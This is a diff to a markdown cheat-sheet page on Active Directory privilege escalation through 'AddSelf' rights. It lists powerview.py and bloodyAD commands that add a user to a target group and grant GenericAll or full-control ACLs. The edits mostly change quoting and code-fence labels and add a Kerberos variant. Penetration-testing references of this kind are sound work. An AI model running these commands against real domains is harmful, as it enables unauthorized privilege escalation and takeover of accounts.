@@ -4,7 +4,6 @@ date: 2024-8-2
 tags: ["addself", "active directory", "ad", "domain controller", "Windows", "powerview", "bloodAD", "privesc"]
 ---
 
----
 ### Privesc #1: Add self to group (From Linux)
 
 {{< tab set1 tab1 active >}}powerview.py{{< /tab >}}
@@ -13,29 +12,29 @@ tags: ["addself", "active directory", "ad", "domain controller", "Windows", "pow
 
 <div>
 
-```bash
+```console
 # Connect
-sudo ntpdate -s <DC> && powerview <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_DOMAIN>
+sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_DOMAIN>'
 ```
 
-```bash
+```console
 # Add self to group
 Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USERNAME>
 ```
 
-```bash
+```console
 # Check
 Get-DomainGroupMember -Identity <TARGET_GROUP>
 ```
 
-```bash
+```console
 # Exit and login again to apply changes
 Add-DomainObjectAcl -TargetIdentity <ANOTHER_GROUP> -PrincipalIdentity <USERNAME> -Rights fullcontrol
 ```
 
-```bash
+```console
 # Check
-Get-DomainObjectAcl -Identity <TARGET_USER_IN_ANOTHER_GROUP> -Where "SecurityIdentifier contains <USERNAME>"
+Get-DomainObjectAcl -Identity <TARGET_USER_IN_ANOTHER_GROUP> -Where 'SecurityIdentifier contains <USERNAME>'
 ```
 
 </div>
@@ -47,14 +46,19 @@ Get-DomainObjectAcl -Identity <TARGET_USER_IN_ANOTHER_GROUP> -Where "SecurityIde
 
 <div>
 
-```bash
+```console
 # Add self to group
-python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> add groupMember <TARGET_GROUP> <USERNAME>
+python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC> add groupMember <TARGET_GROUP> <USERNAME>
 ```
 
-```bash
+```console
+# With Kerberos
+python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -k --host <DC> add groupMember <TARGET_GROUP> <USERNAME>
+```
+
+```console
 # After getting full control of target group (e.g. TARGET_GROUP has genericall over ANOTHER_GROUP)
-python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> add genericAll 'OU=<ANOTHER_GROUP>,DC=<EXAMPLE>,DC=<COM>' <USERNAME>
+python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC> add genericAll 'OU=<ANOTHER_GROUP>,DC=<EXAMPLE>,DC=<COM>' <USERNAME>
 ```
 
 </div>
